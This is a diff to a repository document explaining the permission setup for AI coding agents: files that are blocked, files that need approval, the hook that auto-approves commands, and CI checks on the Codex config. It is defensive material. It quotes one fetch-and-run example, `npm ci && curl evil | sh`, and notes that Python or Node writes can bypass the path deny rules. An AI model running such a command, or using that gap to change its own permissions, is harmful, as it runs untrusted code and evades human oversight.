@@ -1,38 +1,120 @@
 # Agent Sandbox & Off-Limits Config
 
+> **Last updated:** 2026-09-23
+
 This file explains the permission posture committed in `.claude/settings.json`:
 what an autonomous agent (Claude Code) is auto-allowed to run, what it is
-hard-blocked from touching, and how a human changes any of it. Read this if a
-tool call was unexpectedly **denied** or unexpectedly **auto-approved**.
+hard-blocked from touching, what it must stop and ask a human before editing, and
+how a human changes any of it. Read this if a tool call was unexpectedly
+**denied**, unexpectedly **prompted**, or unexpectedly **auto-approved**.
 
-## Two off-limits files (hard-blocked, not prompted)
+`.claude/hooks/__tests__/settings-permissions.test.sh` derives the governed files
+from `settings.json` and fails unless each one has a table row below, under the
+heading for its kind, and is named in CONTRIBUTING.md's pointer row for this file.
 
-The `permissions.deny` block blocks `Edit` and `Write` to exactly two paths:
+## One off-limits file (hard-blocked, not prompted)
+
+The `permissions.deny` block declares one protected file path:
 
 | File | Why it is off-limits |
 |------|----------------------|
 | `.claude/settings.json` | It defines the agent's OWN permissions, hooks, and deny rules. Letting an agent edit it would let the agent widen its own sandbox — rules cannot constrain the thing that governs them. |
-| `.codex/config.toml` | The Codex CLI's committed config (sandbox mode, approval policy, MCP servers). Same self-governance problem for the Codex agent, and a permissive profile here has regressed before — see the Codex permissive-profile guard wired into `.github/workflows/ci.yml`. |
 
-`deny` is a HARD block: the agent gets a refusal, not a "do you want to allow
-this?" prompt. The paths are root-anchored (`/.claude/...`, `/.codex/...`) and
-denied for BOTH `Edit` and `Write` — they are distinct tools, and a deny on one
-does not imply the other.
+The effective path rule is `Edit(/.claude/settings.json)`, which covers file
+edits and writes. The committed `Write(...)` companion is retained by the
+repository tests, but current Claude Code does not consult Write path rules.
+See [file permission rules](https://code.claude.com/docs/en/permissions#read-and-edit).
 
-### How these files actually change
+### How this file actually changes
 
-A human edits them by hand, in a normal editor or via Claude Code's interactive
+A human edits it by hand, in a normal editor or via Claude Code's interactive
 `/permissions` UI — neither path goes through the `Edit`/`Write` tools the deny
-rules gate. CI re-checks both on every change: `settings-permissions.test.sh`
-validates the permissions posture, and the Codex guard in `ci.yml` rejects a
-permissive Codex profile.
+rule gates. CI re-checks the posture on every change with
+`settings-permissions.test.sh`, and the Codex guard in `ci.yml` independently
+rejects a permissive Codex profile whether or not any rule exists.
 
-### If an agent legitimately needs one of these changed
+### If an agent legitimately needs it changed
 
-It cannot do it itself, by design. It should surface the exact change it wants and
+The agent must surface the exact change it wants and
 why, and let a human make the edit (or temporarily lift the rule via
 `/permissions`). Widening the sandbox is a human decision recorded in a reviewable
 diff — not something the agent can do mid-task.
+
+## One ask-first file (explicit file-tool approval)
+
+The `permissions.ask` block declares one file-tool approval path:
+
+| File | Why it is ask-first |
+|------|---------------------|
+| `.codex/config.toml` | It declares the MCP servers a Codex session LAUNCHES. Every `[mcp_servers.*]` table is a `command` + `args` run on the developer's machine with the credentials named in its `env_vars`, so an edit there is code execution the next time someone starts Codex. It is not hard-blocked because it is hand-maintained (its server tables mirror `.mcp.json`), and a hard block made that maintenance impossible for an agent even with a human watching. |
+
+It sat in `deny` beside `settings.json` until #10134 lifted that block for
+maintainability. Lifting it outright left nothing between an agent's
+`Edit`/`Write` and the Codex launch path until CI ran, so it is `ask` instead.
+What `ask` means, per Claude Code's permission docs
+([permissions](https://code.claude.com/docs/en/permissions),
+[permission modes](https://code.claude.com/docs/en/permission-modes)):
+
+- Rules are evaluated deny, then ask, then allow — so no `allow` rule can
+  pre-approve an edit to this file.
+- An explicit ask rule is on the list of "actions no mode auto-approves": it
+  prompts in manual, `acceptEdits`, `auto` **and** `bypassPermissions` mode. An
+  unattended `-p` run denies the call instead of prompting.
+- The person approving sees the proposed edit, so a changed `command`, `args` or
+  `env` is in front of a human before it is on disk.
+
+`Edit(/.codex/config.toml)` supplies the effective path rule; its committed
+`Write(...)` companion is not consulted by current Claude Code.
+
+### How this file actually changes
+
+A human edits it in a normal editor, or approves an agent's `Edit`/`Write` when
+Claude Code prompts. Either way the change then has to pass the CI checks below.
+
+What it does NOT cover, stated plainly:
+
+- **Shell writes.** File-tool ask rules do not guarantee approval of every
+  shell write. Read/Edit deny rules cover recognized commands such as `sed`
+  and `tee` and redirect targets. Arbitrary Python/Node file writes can bypass
+  those path checks; use an OS sandbox for process-wide enforcement.
+- **Other writers.** Claude rules do not govern Codex or human editors. Codex
+  has its own sandbox and approval controls, described below.
+
+Behind every writer, at CI and at push time:
+
+- **Its dangerous PROFILE** — `scripts/check-codex-config-safety.sh` in CI rejects
+  a committed `approval_policy = "never"` together with `network_access = true`,
+  whoever wrote it.
+- **Drift from `.mcp.json`** — `tools/agentic-sync/port.mjs --check` requires the
+  same server names, each with the exact `command` and `args` of its `.mcp.json`
+  entry and every `${VAR}` secret forwarded by name in `env_vars`. It also fails a
+  server whose own table does not set `default_tools_approval_mode = "prompt"`,
+  and a `command`, arg or `cwd` that is a relative path, because Codex resolves
+  those against the directory the session started in. Secret aliases and literal
+  overrides of forwarded secrets are rejected; override keys are compared
+  case-insensitively to cover Windows. It does not compare other server options
+  or unrelated extra `env` entries; the prompt above and PR review see those.
+- **Secret-shaped CONTENT** — GitHub secret-scanning push protection, enabled
+  repo-wide, rejects a recognised credential at push time for every file and every
+  actor. Verify with
+  `gh api repos/Tristan578/project-forge --jq .security_and_analysis`. It matches
+  KNOWN provider patterns, so an arbitrary internal credential with no
+  recognisable shape is not caught by it.
+
+## Codex sessions
+
+The project profile uses `approval_policy = "on-request"` and explicit
+`sandbox_mode = "workspace-write"`; it has no unsupported `allow = ["**/*"]`
+setting. Each MCP server retains `default_tools_approval_mode = "prompt"`.
+The default workspace-write policy protects `.codex` even inside a writable
+checkout. Explicit host/user filesystem rules can override that default; this
+project profile does not do so. See the [Codex permission implementation and
+regression test](https://github.com/openai/codex/blob/8f1490eabe3ec27e92c46fd1b10400be3c910581/codex-rs/protocol/src/permissions.rs#L3277-L3307).
+
+Headless `codex exec` cannot display an interactive approval prompt. For an
+unattended job, supply narrowly scoped explicit tool approvals through its
+host/configuration, or use an interactive session for the operation. Do not
+replace the project defaults with blanket approval to make the job pass.
 
 ## What IS auto-approved (two complementary layers)
 
@@ -68,9 +150,11 @@ whose danger lives in a *flag* is handled by the hook, which can inspect flags.
    `npx skills`, `git worktree list`/`shortlog`/`describe`/`ls-files`/`stash list`/
    `remote -v`, `npm outdated`/`view`/`explain`/`why`/`pkg get`/`cache clean`,
    `npm audit` and `npm audit --<flag>` — but NOT `npm audit fix`). It
-   emits an `allow` decision for a known-safe SINGLE command, `ask` for everything
-   else, and ALWAYS exits 0 — it never hard-blocks. Two gates fire BEFORE the
-   allow-list is consulted:
+   emits `allow` for a known-safe SINGLE command. For other commands it emits
+   `ask`, except in `bypassPermissions`, `dontAsk`, or `auto`, where it emits no
+   decision and the session mode decides. Empty or unparseable input also
+   defers without a decision. It always exits 0. Two gates run before the
+   allow-list:
    - **Operator gate** — refuses any compound, piped, redirected, substituted,
      variable-expanded, or multi-line command even when the leading token is safe
      (`npm ci && curl evil | sh` prefix-matches `npm ci`).
@@ -88,7 +172,8 @@ whose danger lives in a *flag* is handled by the hook, which can inspect flags.
    Its allow-list and exact allow/ask/defer contract are pinned by
    `.claude/hooks/__tests__/auto-approve-safe-commands.test.sh`.
 
-Deliberately NOT auto-approved by either layer (they defer to a prompt):
+Deliberately NOT auto-approved by either layer (the hook asks or defers as
+described above):
 `git branch`/`git tag` (their flag forms mutate refs — `git branch -D`, `git tag
 -d/-f`, bare `git tag <name>` creates a tag — and a prefix gate cannot tell the
 read form from the write form), `npm pkg set`/`delete`/`fix` (mutate the tracked
@@ -98,5 +183,7 @@ read form from the write form), `npm pkg set`/`delete`/`fix` (mutate the tracked
 package binaries), and `npx drizzle-kit` (`drop`/`push` are DB-destructive,
 `generate` writes migration files).
 
-Anything covered by neither layer falls through to a normal permission prompt. The
-default is always "ask the human" — never silently allow, never silently block.
+These layers do not promise a prompt in every session. For an unlisted command,
+the hook asks in ordinary interactive modes, but defers in `bypassPermissions`,
+`dontAsk`, and `auto`. The host then applies its own permissions; it can allow or
+deny without a human prompt.
